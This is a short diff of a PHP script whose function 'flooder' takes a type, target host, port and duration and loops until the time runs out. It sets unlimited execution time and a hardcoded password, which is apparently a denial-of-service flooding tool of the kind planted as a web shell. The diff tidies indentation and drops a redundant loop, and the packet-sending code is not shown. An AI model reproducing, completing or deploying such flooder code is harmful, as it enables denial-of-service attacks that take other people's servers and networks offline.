@@ -14,12 +14,10 @@ ini_set('max_execution_time', 0);
 
 $pass="icg";
 function flooder($type , $host , $port , $time){
-		$packets = 0;
+	$packets = 0;
         $timeserver = time();
         $max_time = $timeserver+$time;
-        for($i=0;$i<65000;$i++){
-                $out = '504w';
-        }
+	$out = '504w';
         while(TRUE){
             if(time() > $max_time){
                     break;
